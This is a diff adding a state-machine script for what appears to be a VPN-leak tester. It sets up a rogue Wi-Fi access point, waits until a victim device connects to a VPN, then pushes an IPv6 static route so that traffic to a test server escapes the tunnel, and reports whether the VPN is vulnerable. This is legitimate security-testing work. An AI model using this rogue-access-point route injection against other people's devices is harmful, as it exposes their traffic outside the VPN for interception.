@@ -1,0 +1,63 @@
+(*
+ * Tunnelvision state machine definition
+ * We push custom routes over dhcp by means of the classless static route option (121)
+ * We abuse the fact that most vpn clients allow traffic to routes other than the default to flow directly.
+ * This variant pushes the static route _after_ the vpn tunnel is set up using a dhcp renew.
+ *)
+
+state init begin:
+  miscnet = miscnet();
+  prefix_len = "64";
+  my_ip = "2a00:1337:1:1:291:9eff:fe3c:325c";
+  (* we want target_ip to flow outside of the tunnel *)
+  target_ip = concat("64:ff9b::", miscnet.lookup_ipv4("vvts.midnightblue.nl"));
+
+  (* perform nat on the interface where our default gateway is at *)
+  miscnet.masquerade("true");
+
+  ap = accesspoint();
+  ap.wifi_interface = "wlan0";
+  ap.ipv6_addr = my_ip;
+  ap.ipv6_prefixlen = prefix_len;
+  ap.slaac_enable = "true";
+  ap.slaac_dns = my_ip;
+  ap.slaac_lifetime = "900"; (* less than 60s is not accepted by android *)
+  ap.dns_enable = "true";
+  ap.nat64_enable = "true";
+  (* prefix length of 120 is very unlikely to be acceptable *)
+  ap.dns_enable = "true";
+  ap.bring_up(ap_up, ap_err);
+
+state ap_err:
+  exit("failed to bring up access point: ", errstr);
+
+state ap_up:
+  mon = trafficmonitor();
+  mon.interface = ap.ap_interface;
+  (* specify vpn endpoints so that the monitor can detect whether vpn traffic occurs *)
+  mon.vpn_endpoints = "tcp://eduvpn.org:443;udp://eduvpn.org:443;tcp://www.eduvpn.org:443;udp://www.eduvpn.org:443";
+  mon.detect_vpn(vpn_detected, mon_err);
+  print("[i] Please connect to the vpn on the victim device");
+
+state mon_err:
+  exit("Error occurred: ", errstr);
+
+state vpn_detected:
+  ap.slaac_static_route(target_ip, "120");
+  ap.slaac_reload();
+  ap.slaac_renew(dhcp_renew);
+  print("[i] Sending Router Advertisement...");
+
+state dhcp_renew:
+  (* make sure validation_server resolves to target_ip *)
+  mon.validation_server = "https://vvts.midnightblue.nl:8443/";
+  mon.detect_attack(vpn_safe, vpn_vuln, mon_err);
+
+state mon_err:
+  exit("Error occurred: ", errstr);
+
+state vpn_safe:
+  exit("Your vpn appears to be safe, congratulations!");
+
+state vpn_vuln:
+  exit("Your vpn appears to be vulnerable!");
